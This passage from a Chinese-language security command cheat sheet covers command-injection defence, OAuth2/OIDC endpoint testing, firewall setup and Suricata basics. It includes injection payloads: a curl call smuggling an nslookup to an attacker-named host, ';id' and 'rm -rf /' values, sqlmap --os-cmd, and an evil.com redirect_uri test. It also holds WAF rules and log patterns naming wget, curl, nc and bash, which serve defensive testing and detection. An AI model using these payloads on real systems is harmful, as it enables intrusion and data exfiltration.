curl -s "https://example.com/ping?host=127.0.0.1;nslookup+test.attacker.com"
```

---

## 命令注入防御(代码层)

**基本写法:Python 使用 subprocess 列表参数**
`subprocess.run(["cmd", arg1, arg2])`
```bash
# Python 使用列表传参避免 shell 注入
# subprocess.run(["ping", "-c", "1", host], shell=False)
```

**基本写法:Python 白名单校验输入**
`re.match(r"^[a-zA-Z0-9._-]+$", <输入>)`
```bash
# 使用正则白名单校验输入参数
python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9._-]+$', '127.0.0.1')))"
```

**基本写法:Python 转义 shell 参数**
`shlex.quote(<参数>)`
```bash
# 使用 shlex.quote 转义 shell 参数
python3 -c "import shlex; print(shlex.quote('127.0.0.1; rm -rf /'))"
```

**基本写法:Node.js 安全执行**
`execFile("ping", ["-c", "1", host])`
```bash
# Node.js 使用 execFile 替代 exec
# const { execFile } = require('child_process');
# execFile('ping', ['-c', '1', host], callback);
```

**基本写法:PHP 安全执行**
`escapeshellarg(<参数>)`
```bash
# PHP 使用 escapeshellarg 转义参数
php -r "echo escapeshellarg('127.0.0.1; rm -rf /');"
```

---

## 危险函数审计

**基本写法:Python 检索危险函数**
`grep -rn "os.system\|subprocess\|popen\|eval\|exec" <项目目录>`
```bash
# 检索 Python 项目中的危险执行函数
grep -rn "os.system\|subprocess.call\|os.popen\|eval\|exec" src/
```

**基本写法:PHP 检索危险函数**
`grep -rn "system\|exec\|passthru\|shell_exec\|popen" <项目目录>`
```bash
# 检索 PHP 项目中的命令执行函数
grep -rn "system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
```

**基本写法:Node.js 检索危险函数**
`grep -rn "exec\|execSync\|spawn" <项目目录>`
```bash
# 检索 Node.js 项目中的命令执行函数
grep -rn "child_process\|exec(\|execSync\|spawn(" src/
```

**基本写法:Java 检索危险函数**
`grep -rn "Runtime.getRuntime\|ProcessBuilder" <项目目录>`
```bash
# 检索 Java 项目中的命令执行
grep -rn "Runtime.getRuntime\|ProcessBuilder\|exec(" src/
```

**基本写法:统计危险函数使用次数**
`grep -rc "system\|exec\|popen" <项目目录> | grep -v ":0"`
```bash
# 统计每个文件中危险函数出现次数
grep -rc "system\|exec\|popen" src/ | grep -v ":0" | sort -t: -k2 -rn
```

---

## 输入校验与过滤

**基本写法:校验 IP 格式**
`python3 -c "import ipaddress; ipaddress.ip_address('<IP>')"`
```bash
# 校验输入是否为合法 IP
python3 -c "import ipaddress; print(ipaddress.ip_address('127.0.0.1'))"
```

**基本写法:校验数字格式**
`[[ "<输入>" =~ ^[0-9]+$ ]]`
```bash
# 使用 bash 正则校验数字输入
[[ "12345" =~ ^[0-9]+$ ]] && echo "合法" || echo "非法"
```

**基本写法:校验域名格式**
`python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9.-]+$', '<域名>')))"`
```bash
# 校验输入是否为合法域名格式
python3 -c "import re; print(bool(re.match(r'^[a-zA-Z0-9.-]+$', 'example.com')))"
```

**基本写法:过滤危险字符**
`<输入> | sed 's/[;&|$\`\\]//g'`
```bash
# 过滤命令注入相关危险字符
echo "127.0.0.1;id" | sed 's/[;&|$\`\\]//g'
```

**基本写法:白名单字符校验**
`python3 -c "print(all(c.isalnum() or c in '.-_' for c in '<输入>'))"`
```bash
# 使用白名单字符校验输入
python3 -c "print(all(c.isalnum() or c in '.-_' for c in '127.0.0.1'))"
```

---

## 操作系统层防御

**基本写法:查看进程执行命令**
`cat /proc/<pid>/cmdline | tr '\0' ' '`
```bash
# 查看进程的完整命令行参数
cat /proc/1234/cmdline | tr '\0' ' '
```

**基本写法:监控 execve 系统调用**
`strace -e trace=execve -p <pid>`
```bash
# 跟踪进程的命令执行行为
strace -e trace=execve -p 1234
```

**基本写法:限制命令执行权限**
`chmod 750 <命令>`
```bash
# 限制危险命令的执行权限
chmod 750 /usr/bin/curl /usr/bin/wget
```

**基本写法:使用 sudo 限制可执行命令**
`<用户> ALL=(root) NOPASSWD: /usr/bin/<命令>`
```bash
# sudoers 限制仅能执行特定命令
# www-data ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx
```

---

## Web 应用防火墙规则

**基本写法:ModSecurity 命令注入规则**
`SecRule ARGS "@rx [;&|$\`\\(]" "deny"`
```bash
# ModSecurity 拦截命令分隔符
SecRule ARGS "@rx [;&|$\`\\(]" "id:1003,deny,status:403,log,msg:'Command Injection'"
```

**基本写法:拦截常见命令名**
`SecRule ARGS "@rx \b(id|whoami|uname|cat|ls|wget|curl)\b" "deny"`
```bash
# ModSecurity 拦截常见命令名
SecRule ARGS "@rx (?i)\b(id|whoami|uname|cat|ls|wget|curl|nc|bash|sh)\b" "id:1004,deny,status:403"
```

**基本写法:Nginx 拦截危险字符**
`if ($args ~* "[;&|$\`]") { return 403; }`
```bash
# Nginx 拦截查询参数中的危险字符
if ($args ~* "[;&|$\`]") {
    return 403;
}
```

**基本写法:Naxsi 命令注入规则**
`CheckRule "$SQL >= 8" DENY;`
```bash
# Naxsi WAF 命令注入拦截规则
BasicRule wl:1001 "msg:command injection";
```

---

## 命令注入检测工具

**基本写法:使用 commix 检测**
`python3 commix.py --url="<URL>" --data="<参数>"`
```bash
# 使用 commix 自动化命令注入检测
python3 commix.py --url="https://example.com/ping" --data="host=127.0.0.1"
```

**基本写法:commix 指定注入点**
`python3 commix.py --url="<URL>" --data="*" --level=3`
```bash
# 自动识别注入点并使用高等级检测
python3 commix.py --url="https://example.com/api?host=127.0.0.1*" --level=3
```

**基本写法:使用 sqlmap 检测操作系统命令**
`sqlmap -u "<URL>" --os-cmd="id"`
```bash
# sqlmap 检测命令注入并执行命令
sqlmap -u "https://example.com/ping?host=127.0.0.1" --os-cmd="id"
```

**基本写法:Burp Suite 主动扫描**
`java -jar burpsuite_pro.jar --scan --url <URL>`
```bash
# Burp 命令行启动扫描
java -jar burpsuite_pro.jar --scan --url https://example.com/ping?host=127.0.0.1
```

---

## 命令注入日志审计

**基本写法:检索可疑 URL 编码命令**
`grep -iE "(%3B|%7C|%60|%24|%26)" <访问日志>`
```bash
# 检索 URL 编码的命令分隔符
grep -iE "(%3B|%7C|%60|%24|%26)" /var/log/nginx/access.log
```

**基本写法:检索明文命令关键字**
`grep -iE "\b(id|whoami|uname|cat|ls|wget|curl|nc|bash)\b" <日志>`
```bash
# 检索访问日志中的命令关键字
grep -iE "\b(id|whoami|uname|cat|ls|wget|curl|nc|bash)\b" /var/log/nginx/access.log
```

**基本写法:统计可疑请求来源**
`grep -iE "(%3B|%7C|%60)" <日志> | awk '{print $1}' | sort | uniq -c`
```bash
# 统计命令注入可疑来源 IP
grep -iE "(%3B|%7C|%60)" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**基本写法:监控 Web 错误日志**
`tail -f <错误日志> | grep -i "sh:\|bash:\|command not found"`
```bash
# 监控命令执行错误的日志
tail -f /var/log/nginx/error.log | grep -i "sh:\|bash:\|command not found"
```

---

## 沙箱与隔离执行

**基本写法:使用 firejail 沙箱执行**
`firejail --noprofile <命令>`
```bash
# 在沙箱中执行不受信任命令
firejail --noprofile --net=none /usr/bin/ping 127.0.0.1
```

**基本写法:Docker 容器隔离执行**
`docker run --rm --network=none alpine <命令>`
```bash
# 在隔离容器中执行命令
docker run --rm --network=none alpine ping -c 1 127.0.0.1
```

**基本写法:使用 chroot 隔离**
`chroot <目录> <命令>`
```bash
# chroot 改变根目录执行
chroot /var/jail /usr/bin/ping 127.0.0.1
```

**基本写法:限制 shell 访问**
`usermod -s /usr/sbin/nologin <用户>`
```bash
# 限制用户无法获得交互式 shell
usermod -s /usr/sbin/nologin www-data
```

---

## 命令注入防护自检

**基本写法:批量测试参数注入**
`for param in <参数列表>; do curl -s "<URL>?$param=;id" | grep -i "uid="; done`
```bash
# 批量测试接口参数是否存在命令注入
for param in host ip addr domain; do
  echo "测试参数 $param:"
  curl -s "https://example.com/api?$param=127.0.0.1;id" | grep -i "uid="
done
```

**基本写法:验证输入校验有效性**
`curl -s "<URL>?param=127.0.0.1;id"`
```bash
# 验证目标是否过滤命令分隔符
curl -s "https://example.com/ping?host=127.0.0.1;id" | grep -i "uid\|gid"
```

**基本写法:验证是否使用安全 API**
`grep -rn "shell=True" <项目目录>`
```bash
# 检查是否使用 shell=True 危险参数
grep -rn "shell=True" src/
```

**基本写法:检查禁用函数列表**
`php -r "echo ini_get('disable_functions');"`
```bash
# 查看 PHP 禁用的危险函数
php -r "echo ini_get('disable_functions');"
```



<!-- ============ 文档分隔线：033-cybersecurity/049-OAuth2OIDC.md ============ -->


## OAuth2 端点探测

**基本写法:获取授权服务器元数据**
`curl -s <URL>/.well-known/oauth-authorization-server`
```bash
# 获取 OAuth2 授权服务器配置信息
curl -s https://example.com/.well-known/oauth-authorization-server
```

**基本写法:获取 OIDC 发现文档**
`curl -s <URL>/.well-known/openid-configuration`
```bash
# 获取 OIDC 配置发现文档
curl -s https://example.com/.well-known/openid-configuration
```

**基本写法:获取 JWKS 公钥集**
`curl -s <URL>/.well-known/jwks.json`
```bash
# 获取签名 Token 的公钥集合
curl -s https://example.com/.well-known/jwks.json
```

**基本写法:测试授权端点**
`curl -s -I "<URL>/authorize?response_type=code&client_id=<ID>&redirect_uri=<回调>"`
```bash
# 测试授权端点是否可用
curl -s -I "https://example.com/oauth/authorize?response_type=code&client_id=client123&redirect_uri=https://app.com/callback"
```

**基本写法:测试 Token 端点**
`curl -s -X POST <URL>/token -d "grant_type=client_credentials"`
```bash
# 测试 Token 端点响应
curl -s -X POST https://example.com/oauth/token -d "grant_type=client_credentials&client_id=app&client_secret=secret"
```

---

## 授权码流程测试

**基本写法:构造授权请求**
`<URL>/authorize?response_type=code&client_id=<ID>&redirect_uri=<回调>&scope=<范围>&state=<状态>`
```bash
# 构造标准授权码请求
echo "https://example.com/oauth/authorize?response_type=code&client_id=app123&redirect_uri=https://app.com/callback&scope=openid+profile&state=$(openssl rand -hex 8)"
```

**基本写法:使用 PKCE 构造请求**
`<URL>/authorize?response_type=code&client_id=<ID>&code_challenge=<挑战值>&code_challenge_method=S256`
```bash
# 构造带 PKCE 的授权请求
VERIFIER=$(openssl rand -base64 32 | tr -d '+/=' | head -c 43)
CHALLENGE=$(echo -n "$VERIFIER" | openssl dgst -sha256 -binary | openssl base64 | tr -d '+/=' | head -c 43)
echo "https://example.com/oauth/authorize?response_type=code&client_id=app123&code_challenge=$CHALLENGE&code_challenge_method=S256"
```

**基本写法:用授权码换 Token**
`curl -X POST <URL>/token -d "grant_type=authorization_code&code=<授权码>&redirect_uri=<回调>&client_id=<ID>"`
```bash
# 使用授权码交换访问 Token
curl -X POST https://example.com/oauth/token -d "grant_type=authorization_code&code=abc123&redirect_uri=https://app.com/callback&client_id=app123&client_secret=secret"
```

**基本写法:PKCE 换 Token**
`curl -X POST <URL>/token -d "grant_type=authorization_code&code=<授权码>&code_verifier=<校验值>"`
```bash
# PKCE 流程交换 Token
curl -X POST https://example.com/oauth/token -d "grant_type=authorization_code&code=abc123&code_verifier=verifier_value&client_id=app123"
```

---

## 客户端凭据流程

**基本写法:请求客户端凭据 Token**
`curl -X POST <URL>/token -d "grant_type=client_credentials&scope=<范围>"`
```bash
# 服务间调用获取 Token
curl -X POST https://example.com/oauth/token -u "client_id:client_secret" -d "grant_type=client_credentials&scope=read"
```

**基本写法:使用 Basic 认证**
`curl -X POST <URL>/token -u "<ID>:<密钥>" -d "grant_type=client_credentials"`
```bash
# 使用 Basic Auth 方式传递客户端凭据
curl -X POST https://example.com/oauth/token -u "app123:secret" -d "grant_type=client_credentials"
```

**基本写法:刷新 Token**
`curl -X POST <URL>/token -d "grant_type=refresh_token&refresh_token=<刷新令牌>"`
```bash
# 使用刷新令牌获取新的访问 Token
curl -X POST https://example.com/oauth/token -d "grant_type=refresh_token&refresh_token=refresh_value&client_id=app123&client_secret=secret"
```

**基本写法:密码凭据流程(已不推荐)**
`curl -X POST <URL>/token -d "grant_type=password&username=<用户>&password=<密码>"`
```bash
# 资源所有者密码流程(已废弃)
curl -X POST https://example.com/oauth/token -d "grant_type=password&username=admin&password=pass&client_id=app123"
```

---

## Token 校验与自省

**基本写法:调用自省端点**
`curl -X POST <URL>/introspect -d "token=<Token>"`
```bash
# 使用 Token 自省端点验证 Token 状态
curl -X POST https://example.com/oauth/introspect -u "app123:secret" -d "token=access_token_value"
```

**基本写法:本地校验 JWT**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', algorithms=['HS256'], audience='<受众>'))"`
```bash
# 本地校验 JWT 签名与声明
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['RS256'], audience='api.example.com', options={'verify_aud': True}))"
```

**基本写法:使用 JWKS 校验**
`python3 -c "import jwt, requests; jwks=requests.get('<JWKS_URL>').json(); print(jwks)"`
```bash
# 获取 JWKS 并校验 RS256 Token
python3 -c "import jwt, requests; jwks=requests.get('https://example.com/.well-known/jwks.json').json(); print(jwt.decode('eyJ...', key=jwks, algorithms=['RS256']))"
```

**基本写法:UserInfo 端点调用**
`curl -H "Authorization: Bearer <Token>" <URL>/userinfo`
```bash
# 调用 OIDC UserInfo 端点获取用户信息
curl -H "Authorization: Bearer access_token_value" https://example.com/userinfo
```

---

## OAuth2 安全检测

**基本写法:检测 redirect_uri 校验**
`curl -I "<URL>/authorize?client_id=<ID>&redirect_uri=https://evil.com&response_type=code"`
```bash
# 测试是否校验 redirect_uri 防止开放重定向
curl -I "https://example.com/oauth/authorize?client_id=app123&redirect_uri=https://evil.com&response_type=code"
```

**基本写法:检测 state 参数缺失**
`curl -I "<URL>/authorize?client_id=<ID>&response_type=code&redirect_uri=<回调>"`
```bash
# 测试是否强制要求 state 参数防 CSRF
curl -I "https://example.com/oauth/authorize?client_id=app123&response_type=code&redirect_uri=https://app.com/callback"
```

**基本写法:测试 scope 越权**
`curl -X POST <URL>/token -d "grant_type=client_credentials&scope=admin superuser"`
```bash
# 测试能否请求超出授权范围的 scope
curl -X POST https://example.com/oauth/token -u "app123:secret" -d "grant_type=client_credentials&scope=admin superuser"
```

**基本写法:检测隐式流程是否启用**
`curl -I "<URL>/authorize?response_type=token&client_id=<ID>"`
```bash
# 检测是否支持不安全的隐式流程
curl -I "https://example.com/oauth/authorize?response_type=token&client_id=app123"
```

---

## Keycloak 命令行操作

**基本写法:获取管理员 Token**
`curl -X POST <URL>/realms/master/protocol/openid-connect/token -d "grant_type=password&username=admin&password=<密码>"`
```bash
# 获取 Keycloak 管理员 Token
curl -X POST https://kc.example.com/realms/master/protocol/openid-connect/token -d "grant_type=password&username=admin&password=admin&client_id=admin-cli"
```

**基本写法:列出所有 Realm**
`curl -H "Authorization: Bearer <Token>" <URL>/admin/realms`
```bash
# 列出 Keycloak 中所有 Realm
curl -H "Authorization: Bearer admin_token" https://kc.example.com/admin/realms
```

**基本写法:创建 Realm**
`curl -X POST -H "Authorization: Bearer <Token>" -H "Content-Type: application/json" <URL>/admin/realms -d '<JSON>'`
```bash
# 创建新的 Realm
curl -X POST -H "Authorization: Bearer admin_token" -H "Content-Type: application/json" https://kc.example.com/admin/realms -d '{"realm":"myrealm","enabled":true}'
```

**基本写法:创建客户端**
`curl -X POST -H "Authorization: Bearer <Token>" <URL>/admin/realms/<Realm>/clients -d '<JSON>'`
```bash
# 在指定 Realm 中创建客户端
curl -X POST -H "Authorization: Bearer admin_token" -H "Content-Type: application/json" https://kc.example.com/admin/realms/myrealm/clients -d '{"clientId":"app123","enabled":true}'
```

---

## OAuth2 服务端配置

**基本写法:nginx 模板反向代理 OAuth2**
`proxy_pass <后端URL>;`
```bash
# 反向代理 OAuth2 后端服务
location /oauth {
    proxy_pass http://127.0.0.1:8080/oauth;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

**基本写法:Apache oauth2-proxy**
`ProxyPass /oauth2/ http://127.0.0.1:4180/oauth2/`
```bash
# Apache 反向代理 oauth2-proxy
ProxyPass /oauth2/ http://127.0.0.1:4180/oauth2/
ProxyPassReverse /oauth2/ http://127.0.0.1:4180/oauth2/
```

**基本写法:oauth2-proxy 启动**
`oauth2-proxy --http-address="0.0.0.0:4180" --upstream="<后端>" --client-id="<ID>" --client-secret="<密钥>" --email-domain="<域名>"`
```bash
# 启动 oauth2-proxy 服务
oauth2-proxy --http-address="0.0.0.0:4180" --upstream="http://127.0.0.1:8080/" --client-id="app123" --client-secret="secret" --cookie-secret=$(openssl rand -base64 32) --email-domain="example.com"
```

**基本写法:配置 cookie 安全属性**
`--cookie-secure --cookie-httponly --cookie-samesite=lax`
```bash
# oauth2-proxy 配置安全 Cookie
oauth2-proxy --cookie-secure --cookie-httponly --cookie-samesite=lax --cookie-name="_oauth2_proxy"
```

---

## OAuth2 日志审计

**基本写法:检索 OAuth 请求日志**
`grep -iE "/oauth/|/authorize|/token" <日志>`
```bash
# 检索所有 OAuth2 相关请求
grep -iE "/oauth/|/authorize|/token|/introspect" /var/log/nginx/access.log
```

**基本写法:统计 Token 端点调用**
`grep "/token" <日志> | awk '{print $1}' | sort | uniq -c | sort -rn`
```bash
# 统计 Token 端点调用来源 IP
grep "/oauth/token" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**基本写法:检测 redirect_uri 攻击**
`grep -i "redirect_uri" <日志> | grep -i "evil\|attacker"`
```bash
# 检测可疑的 redirect_uri 重定向
grep -i "redirect_uri" /var/log/nginx/access.log | grep -iE "evil|attacker|hack"
```

**基本写法:监控异常 scope 请求**
`grep "scope" <日志> | grep -iE "admin|root|superuser"`
```bash
# 监控异常权限提升请求
grep "scope" /var/log/nginx/access.log | grep -iE "admin|root|superuser"
```

---

## OAuth2 安全自检

**基本写法:检查 PKCE 是否强制**
`curl -I "<URL>/authorize?response_type=code&client_id=<ID>"`
```bash
# 不带 PKCE 的请求测试是否被拒绝
curl -I "https://example.com/oauth/authorize?response_type=code&client_id=app123&redirect_uri=https://app.com/callback"
```

**基本写法:检查 HTTPS 强制**
`curl -I http://<URL>/.well-known/openid-configuration`
```bash
# 测试 HTTP 是否被重定向到 HTTPS
curl -I http://example.com/.well-known/openid-configuration
```

**基本写法:验证 Token 过期时间**
`python3 -c "import jwt; print(jwt.decode('<Token>', options={'verify_signature': False})['exp'])"`
```bash
# 检查 Token 过期时间是否合理
python3 -c "import jwt; print(jwt.decode('eyJ...', options={'verify_signature': False}))"
```

**基本写法:批量检查客户端配置**
`curl -H "Authorization: Bearer <Token>" <URL>/admin/realms/<Realm>/clients`
```bash
# 列出所有客户端配置检查安全性
curl -H "Authorization: Bearer admin_token" https://kc.example.com/admin/realms/myrealm/clients | python3 -m json.tool
```



<!-- ============ 文档分隔线：033-cybersecurity/050-FirewallConfig.md ============ -->


## ufw 基础操作

**基本写法:启用 ufw 防火墙**
`ufw enable`
```bash
# 启用 ufw 防火墙(会提示会中断现有 SSH 连接)
sudo ufw enable
```

**基本写法:禁用 ufw 防火墙**
`ufw disable`
```bash
# 关闭 ufw 防火墙
sudo ufw disable
```

**基本写法:查看 ufw 状态**
`ufw status verbose`
```bash
# 查看 ufw 详细状态与规则
sudo ufw status verbose
```

**基本写法:重置 ufw 规则**
`ufw reset`
```bash
# 重置所有 ufw 规则到默认状态
sudo ufw reset
```

**基本写法:重载 ufw 规则**
`ufw reload`
```bash
# 重新加载 ufw 规则使配置生效
sudo ufw reload
```

---

## ufw 默认策略

**基本写法:设置默认拒绝入站**
`ufw default deny incoming`
```bash
# 默认拒绝所有入站流量
sudo ufw default deny incoming
```

**基本写法:设置默认允许出站**
`ufw default allow outgoing`
```bash
# 默认允许所有出站流量
sudo ufw default allow outgoing
```

**基本写法:设置默认拒绝转发**
`ufw default deny forward`
```bash
# 默认拒绝转发流量
sudo ufw default deny forward
```

**基本写法:查看默认策略**
`ufw status verbose | grep Default`
```bash
# 查看 ufw 当前默认策略
sudo ufw status verbose | grep Default
```

---

## ufw 规则管理

**基本写法:允许 SSH 服务**
`ufw allow <端口>/<协议>`
```bash
# 允许 SSH 服务
sudo ufw allow 22/tcp
```

**基本写法:允许 HTTP/HTTPS**
`ufw allow <服务名>`
```bash
# 允许 Web 服务
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
```

**基本写法:限制特定 IP 访问**
`ufw allow from <IP> to any port <端口>`
```bash
# 仅允许特定 IP 访问 SSH
sudo ufw allow from 192.168.1.100 to any port 22
```

**基本写法:拒绝特定 IP**
`ufw deny from <IP>`
```bash
# 拒绝特定 IP 所有访问
sudo ufw deny from 203.0.113.10
```

**基本写法:限制连接速率**
`ufw limit <端口>/<协议>`
```bash
# 限制 SSH 连接速率防爆破
sudo ufw limit 22/tcp
```

**基本写法:删除规则**
`ufw delete allow <端口>/<协议>`
```bash
# 删除指定端口允许规则
sudo ufw delete allow 80/tcp
```

---

## ufw IPv6 与应用配置

**基本写法:启用 IPv6 支持**
`sed -i 's/IPV6=no/IPV6=yes/' /etc/default/ufw`
```bash
# 修改 ufw 配置启用 IPv6
sudo sed -i 's/IPV6=no/IPV6=yes/' /etc/default/ufw
```

**基本写法:使用应用配置文件**
`ufw app list`
```bash
# 列出所有可用应用配置
sudo ufw app list
```

**基本写法:启用应用配置**
`ufw allow <应用名>`
```bash
# 使用应用配置文件开放端口
sudo ufw allow "Nginx Full"
```

**基本写法:查看应用信息**
`ufw app info <应用名>`
```bash
# 查看应用配置文件详情
sudo ufw app info "Nginx Full"
```

**基本写法:创建自定义应用配置**
`cat /etc/ufw/applications.d/<应用>`
```bash
# 创建自定义应用配置文件
sudo tee /etc/ufw/applications.d/myapp << 'EOF'
[myapp]
title=My Application
description=Custom application
ports=8080/tcp
EOF
```

---

## firewalld 基础操作

**基本写法:启动 firewalld**
`systemctl start firewalld`
```bash
# 启动 firewalld 服务
sudo systemctl start firewalld
sudo systemctl enable firewalld
```

**基本写法:查看 firewalld 状态**
`firewall-cmd --state`
```bash
# 查看 firewalld 运行状态
sudo firewall-cmd --state
```

**基本写法:重载 firewalld 配置**
`firewall-cmd --reload`
```bash
# 重载防火墙配置不中断连接
sudo firewall-cmd --reload
```

**基本写法:完全重载**
`firewall-cmd --complete-reload`
```bash
# 完全重载会中断现有连接
sudo firewall-cmd --complete-reload
```

**基本写法:panic 模式**
`firewall-cmd --panic-on`
```bash
# 紧急情况阻断所有流量
sudo firewall-cmd --panic-on
```

---

## firewalld 区域管理

**基本写法:列出所有区域**
`firewall-cmd --get-zones`
```bash
# 列出所有预定义区域
sudo firewall-cmd --get-zones
```

**基本写法:查看默认区域**
`firewall-cmd --get-default-zone`
```bash
# 查看默认区域
sudo firewall-cmd --get-default-zone
```

**基本写法:设置默认区域**
`firewall-cmd --set-default-zone=<区域>`
```bash
# 设置默认区域
sudo firewall-cmd --set-default-zone=public
```

**基本写法:查看区域配置**
`firewall-cmd --zone=<区域> --list-all`
```bash
# 查看 public 区域详细配置
sudo firewall-cmd --zone=public --list-all
```

**基本写法:更改接口区域**
`firewall-cmd --zone=<区域> --change-interface=<接口>`
```bash
# 将 eth0 接口加入 trusted 区域
sudo firewall-cmd --zone=trusted --change-interface=eth0
```

---

## firewalld 服务与端口管理

**基本写法:添加服务**
`firewall-cmd --permanent --add-service=<服务>`
```bash
# 永久添加 HTTP 服务
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --reload
```

**基本写法:开放端口**
`firewall-cmd --permanent --add-port=<端口>/<协议>`
```bash
# 永久开放 8080 端口
sudo firewall-cmd --permanent --add-port=8080/tcp
sudo firewall-cmd --reload
```

**基本写法:限制特定 IP 访问**
`firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="<IP>" port port="<端口>" protocol="<协议>" accept'`
```bash
# 仅允许特定 IP 访问 MySQL
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.100" port port="3306" protocol="tcp" accept'
sudo firewall-cmd --reload
```

**基本写法:拒绝特定 IP**
`firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="<IP>" reject'`
```bash
# 拒绝特定 IP 所有访问
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="203.0.113.10" reject'
sudo firewall-cmd --reload
```

**基本写法:端口转发**
`firewall-cmd --permanent --add-forward-port=port=<端口>:proto=<协议>:toport=<目标端口>`
```bash
# 端口转发 80 到 8080
sudo firewall-cmd --permanent --add-forward-port=port=80:proto=tcp:toport=8080
sudo firewall-cmd --reload
```

---

## iptables 高级配置

**基本写法:查看 iptables 规则**
`iptables -L -n -v --line-numbers`
```bash
# 查看所有链的规则带行号
sudo iptables -L -n -v --line-numbers
```

**基本写法:阻止 IP**
`iptables -A INPUT -s <IP> -j DROP`
```bash
# 丢弃特定 IP 所有数据包
sudo iptables -A INPUT -s 203.0.113.10 -j DROP
```

**基本写法:限速防爆破**
`iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP`
```bash
# 60 秒内超过 4 次 SSH 连接则丢弃
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

**基本写法:保存 iptables 规则**
`iptables-save > <文件>`
```bash
# 保存 iptables 规则到文件
sudo iptables-save > /etc/iptables/rules.v4
```

**基本写法:恢复 iptables 规则**
`iptables-restore < <文件>`
```bash
# 从文件恢复 iptables 规则
sudo iptables-restore < /etc/iptables/rules.v4
```

---

## 防火墙日志审计

**基本写法:启用 ufw 日志**
`ufw logging on`
```bash
# 开启 ufw 日志记录
sudo ufw logging on
sudo ufw logging medium
```

**基本写法:查看 ufw 日志**
`tail -f /var/log/ufw.log`
```bash
# 实时查看 ufw 日志
sudo tail -f /var/log/ufw.log
```

**基本写法:统计被拦截的 IP**
`grep "UFW BLOCK" /var/log/ufw.log | awk '{print $NF}' | sort | uniq -c | sort -rn`
```bash
# 统计被 ufw 拦截的 IP 排行
sudo grep "UFW BLOCK" /var/log/ufw.log | grep -oE "SRC=[0-9.]+" | sort | uniq -c | sort -rn | head
```

**基本写法:firewalld 日志查看**
`journalctl -u firewalld -f`
```bash
# 查看 firewalld 服务日志
sudo journalctl -u firewalld -f
```

**基本写法:iptables 记录日志**
`iptables -A INPUT -j LOG --log-prefix "iptables-drop: " --log-level 4`
```bash
# 记录被丢弃的数据包
sudo iptables -A INPUT -j LOG --log-prefix "iptables-drop: " --log-level 4
sudo iptables -A INPUT -j DROP
```

---

## 防火墙安全自检

**基本写法:扫描开放端口**
`nmap -sT -p- <本机IP>`
```bash
# 扫描本机所有开放端口
nmap -sT -p- 127.0.0.1
```

**基本写法:从外部验证端口**
`nc -zv <IP> <端口>`
```bash
# 测试目标端口是否可达
nc -zv 192.168.1.10 22
```

**基本写法:检查 ufw 规则顺序**
`ufw status numbered`
```bash
# 查看带编号的 ufw 规则
sudo ufw status numbered
```

**基本写法:批量检查防火墙配置**
`ufw status && firewall-cmd --list-all && iptables -L -n`
```bash
# 一次性查看各类防火墙配置
sudo ufw status verbose && sudo firewall-cmd --list-all && sudo iptables -L -n
```

---

## 防火墙规则备份与恢复

**基本写法:备份 ufw 规则**
`tar -czf ufw-backup.tar.gz /etc/ufw /lib/ufw`
```bash
# 备份 ufw 配置文件
sudo tar -czf ufw-backup-$(date +%F).tar.gz /etc/ufw /lib/ufw
```

**基本写法:备份 firewalld 配置**
`tar -czf firewalld-backup.tar.gz /etc/firewalld`
```bash
# 备份 firewalld 配置
sudo tar -czf firewalld-backup-$(date +%F).tar.gz /etc/firewalld
```

**基本写法:导出 firewalld 配置**
`firewall-cmd --permanent --list-all-zones > <文件>`
```bash
# 导出所有区域配置到文件
sudo firewall-cmd --permanent --list-all-zones > firewalld-export.txt
```

**基本写法:导出 iptables 规则**
`iptables-save > <文件>; ip6tables-save > <文件>`
```bash
# 导出 IPv4 与 IPv6 规则
sudo iptables-save > iptables-v4.rules
sudo ip6tables-save > iptables-v6.rules
```



<!-- ============ 文档分隔线：033-cybersecurity/051-IDSIPSCommands.md ============ -->


## Suricata 基础操作

**基本写法:启动 Suricata**
`suricata -c <配置文件> -i <接口>`
```bash
# 启动 Suricata 监听 eth0 接口
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

**基本写法:守护进程模式启动**
`suricata -c <配置文件> --pidfile <PID文件> -D`
```bash
# 后台守护进程运行 Suricata
sudo suricata -c /etc/suricata/suricata.yaml --pidfile /var/run/suricata.pid -D
```

**基本写法:使用 PCAP 文件离线分析**
`suricata -r <PCAP文件> -c <配置文件>`
```bash
# 离线分析 PCAP 抓包文件
suricata -r capture.pcap -c /etc/suricata/suricata.yaml
```

**基本写法:测试配置文件**
`suricata -T -c <配置文件>`
```bash
# 校验 Suricata 配置文件语法
suricata -T -c /etc/suricata/suricata.yaml
```

**基本写法:查看 Suricata 版本**
`suricata --build-info`
```bash
# 查看 Suricata 版本与编译信息
suricata --build-info
```

---

## Suricata 规则更新

**基本写法:更新规则库**
`suricata-update`
```bash
# 更新 Suricata 规则集
sudo suricata-update
```

**基本写法:指定规则源**
`suricata-update --source <源名>`
```bash
# 从指定源更新规则
sudo suricata-update --source et/open
```

**基本写法:列出规则源**
`suricata-update list-sources`
```bash
# 列出所有可用规则源
sudo suricata-update list-sources
```

**基本写法:启用规则源**
`suricata-update enable-source <源名>`
```bash
# 启用 ET Pro 规则源
sudo suricata-update enable-source et/pro
```

**基本写法:测试规则文件**
`suricata -T -S <规则文件> -c <配置文件>`
```bash
# 测试自定义规则文件语法
suricata -T -S /etc/suricata/rules/local.rules -c /etc/suricata/suricata.yaml
```

---

## Suricata 规则编写

**基本写法:检测特定端口流量**
